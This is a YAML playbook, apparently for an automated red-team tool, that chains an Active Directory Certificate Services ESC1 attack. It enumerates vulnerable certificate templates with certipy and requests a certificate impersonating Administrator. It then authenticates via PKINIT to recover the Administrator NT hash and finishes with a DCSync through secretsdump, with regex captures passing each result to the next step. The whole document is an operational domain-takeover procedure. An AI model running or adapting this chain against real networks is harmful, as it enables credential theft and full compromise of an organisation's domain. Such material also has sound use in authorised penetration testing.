id: esc1-adcs-takeover
name: "ADCS ESC1 — request cert as anyone, become DA"
description: >
  Find a Certificate Template with ENROLLEE_SUPPLIES_SUBJECT enabled and
  enroll rights for low-priv users, then request a cert with the
  Administrator UPN in the SAN. Authenticate via PKINIT and recover the
  target user's NT hash.
tags: [adcs, esc1, priv-esc, certificates, active-directory]
difficulty: medium

inputs:
  - name: dc_ip
    source: target_context.ip
    required: true
  - name: domain
    source: target_context.domain
    required: true
  - name: user
    source: target_context.user
    required: true
  - name: password
    source: target_context.password
    required: true

steps:
  - id: find_templates
    name: "Enumerate the CA and vulnerable templates"
    command_ref: certipy-find
    inputs:
      ip: "${dc_ip}"
      domain: "${domain}"
      user: "${user}"
      password: "${password}"
    notes: |
      Look at the report: any template marked `[!] Vulnerabilities: ESC1`
      with `Enrollment Rights: Domain Users` (or your user's groups) is a
      go. Record the template name and the issuing CA name.
    capture:
      - var: vuln_template
        regex: 'Template Name\s*:\s*(\S+)\s*\n[\s\S]*?Vulnerabilities[\s\S]*?ESC1'
        match: first
      - var: ca_name
        regex: '\[Certificate Authority\][\s\S]*?CA Name\s*:\s*(.+?)$'
        match: first

  - id: request_cert
    name: "Request cert with Administrator UPN in SAN"
    command_ref: certipy-esc1
    requires: [vuln_template, ca_name]
    inputs:
      domain: "${domain}"
      user: "${user}"
      password: "${password}"
      dc-ip: "${dc_ip}"
      ca_name: "${ca_name}"
      vulnerable_template: "${vuln_template}"
      target_user: "administrator"
    capture:
      - var: pfx_file
        regex: "Saved certificate and private key to '(.+?\\.pfx)'"
        match: first

  - id: pkinit_auth
    name: "PKINIT auth with the cert → DA NT hash"
    command_ref: certipy-auth
    requires: [pfx_file]
    inputs:
      pfx_file: "${pfx_file}"
      ip: "${dc_ip}"
    capture:
      - var: dc_nt_hash
        regex: "(?:NT hash|Got hash for[^:]+):[^a-f0-9]*([a-f0-9]{32})"
        match: first

  - id: dcsync
    name: "DCSync with the recovered DA hash"
    command_ref: secretsdump
    requires: [dc_nt_hash]
    notes: |
      Use the NTLM-hash variation of secretsdump. The recovered hash IS
      Administrator's NT — at this point the domain is compromised.

references:
  - title: "Certified Pre-Owned (ADCS attacks)"
    url:   "https://posts.specterops.io/certified-pre-owned-d95910965cd2"
  - title: "Certipy README"
    url:   "https://github.com/ly4k/Certipy"
